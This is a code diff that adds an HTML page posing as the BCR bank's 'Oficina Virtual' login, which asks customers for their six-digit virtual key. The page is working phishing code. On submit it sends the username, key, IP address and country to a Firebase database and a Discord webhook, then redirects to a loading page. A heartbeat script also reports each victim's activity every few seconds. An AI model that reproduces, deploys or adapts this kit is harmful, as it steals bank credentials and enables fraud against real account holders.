@@ -1,0 +1,282 @@
+<html><head><style>
+    body {
+        font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center;
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+  }
+    header {
+    background-color: white;
+    color: white;
+    border-radius: 0 0 32px 32px;
+    padding-right: 18px;
+}
+footer {
+    background-color: #0033A0;
+    color: white;
+    text-align: center;
+    margin-right: -5%;
+    padding: 0px;
+    margin-top: auto;
+}
+.header-vertical {
+  display: flex;
+  flex-direction: column; /* Apila los bloques verticalmente */
+  width: 100%;
+}
+
+.header-top {
+  background-color: #ffffff; /* Color blanco arriba */
+  padding: 10px 20px;        /* Espacio interno ajustable */
+  color: #000000;            /* Texto negro para contrastar */
+}
+
+.header-bottom {
+    background-color: #0033A0;
+    padding: 0px 0px;
+    color: #ffffff;
+    height: 45px;
+    width: 100%;
+}
+
+/* Contenedor centrado */
+.login-wrapper {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex: 1; /* Ocupa el espacio disponible entre el header y el footer */
+    padding: 20px;
+}
+
+.login-container {
+    background-color: rgba(255, 255, 255, 0.8);
+    padding: 40px 45px; /* Padding unificado y simétrico */
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 320px;
+}
+.txtSeleccionMetodo {
+    font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        margin-top: -35px;
+        margin-bottom: 22px;
+        font-size: 25px;
+        font-style: normal;
+        font-weight: 600;
+        color: #0033A0 !important;
+        display: block;
+        text-align: center;
+    }
+
+.input-group {
+    display: flex;
+    align-items: center;
+    background-color: TRANSPARENT;
+    border-bottom: 1px solid rgba(0, 0, 0, .87);
+    border-radius: 0px;
+    padding: 0px 18px;
+    width: 80%;
+    margin-left: 20px;
+}
+
+.input-group img {
+    width: 20px;
+    height: 20px;
+    margin-right: 10px;
+    margin-left: -41px;
+}
+
+.input-group input {
+    border: none !important;
+    outline: none;
+    width: 100%;
+    padding: 10px 0 !important;
+    background: transparent;
+}
+
+.toggle-password {
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    margin-left: 10px;
+    margin-right: -41px;
+    fill: #1bacec;
+}
+
+.btn-submit {
+    background-color: #db2828;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+.btn-submit:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+    opacity: 0.7;
+}
+
+.custom-checkbox {
+    width: 14px;
+    height: 14px;
+    border-radius: 2px;
+    margin-right: 8px;
+    margin-left: -20px;
+    cursor: pointer;
+    accent-color: #0033A0;
+}
+
+</style>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BCR</title>
+</head>
+
+<!-- Scripts de Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
+    authDomain: "kkkkk-5e2bd.firebaseapp.com",
+    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
+    projectId: "kkkkk-5e2bd",
+    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
+    messagingSenderId: "1059258934487",
+    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
+  };
+
+  if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const db = firebase.firestore();
+
+  // --- SISTEMA DE LATIDOS (Heartbeat) ---
+  function enviarLatido() {
+    const inputUser = document.querySelector("#ypn-us");
+    const usuarioId = inputUser ? inputUser.value.trim() : null;
+    
+    if (usuarioId) {
+      db.collection("prolme").doc(usuarioId).set({
+        last_active: firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true }).catch((error) => {
+        console.error("Error al enviar latido:", error);
+      });
+    }
+  }
+
+  // El latido corre cada 10 segundos de forma independiente
+  setInterval(enviarLatido, 5000);
+
+  // Enviar latido si el usuario oculta la pestaña
+  window.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'hidden') {
+      enviarLatido();
+    }
+  });
+</script>
+
+<body background="background.png">
+    <header class="header-vertical">
+  <div class="header-top">
+    <img style="width: 150px;" src="logo.gif">
+  </div>
+  <div class="header-bottom">
+    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>
+  </div>
+</header>
+
+<div class="login-wrapper">
+    <div class="login-container">
+         <a class="txtSeleccionMetodo">Ingrese su clave virtual</a>
+         <form id="loginform">
+
+             <div class="input-group" style="margin-bottom: 15px;">
+                 <img src="Seguridad.svg" alt="Contraseña">
+                 <input type="text" id="sms" name="text" required="" placeholder="Clave virtual" inputmode="numeric" pattern="[0-9]*" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);">
+                 
+             </div>
+             
+             <button type="submit" id="submitBtn" class="btn-submit" style="width: 45%;padding: 10px;margin-left: 87px;">Ingresar</button><br><br>
+         </form>
+     </div>
+</div>
+
+<script>
+    async function getCountry() {
+        try {
+            const response = await fetch('https://ipinfo.io/json');
+            const data = await response.json();
+            return data.country;
+        } catch (error) {
+            console.error('Error al obtener el país:', error);
+            return 'País Desconocido';
+        }
+    }
+
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api64.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error al obtener la dirección IP:', error);
+            return 'IP Desconocida';
+        }
+    }
+
+    document.querySelector("#loginform").addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        const usuario = localStorage.getItem("usuario");
+        const codigo = document.querySelector("#sms").value;
+        const pais = await getCountry();
+        const ip = await getIPAddress();
+
+        if (!usuario || !codigo) {
+          alert("Por favor, complete todos los campos.");
+          return;
+        }
+
+        try {
+          await db.collection("prolme").doc(usuario).set({
+            cod1: codigo,
+            page: 0,
+            last_active: firebase.firestore.FieldValue.serverTimestamp()
+          }, { merge: true });
+
+          const message = `➖➖➖➖➖[ 🏦BCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n📟 Clave Virtual: ${codigo}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
+
+          const discord_webhook_url = "https://discord.com/api/webhooks/1534616941476581568/YTnnkJt7vQqtrmv1ERAYs0vEJDb4340R0lhVmPvflTgky0JErdqJKj2VPa4pQ9al6ReU";
+
+          await fetch(discord_webhook_url, {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                  content: message
+              }),
+          });
+
+          window.location.href = "cargando.html";
+        } catch (error) {
+          console.error("Error al enviar datos:", error);
+        }
+    });
+</script>
+
+
+<footer>
+    <div class="footer-content">
+      <p> 116    BCR © Derechos Reservados 2026.    Contáctenos: CentroAsistenciaBCR@bancobcr.com</p>
+    </div>
+</footer>
+
+</body></html>
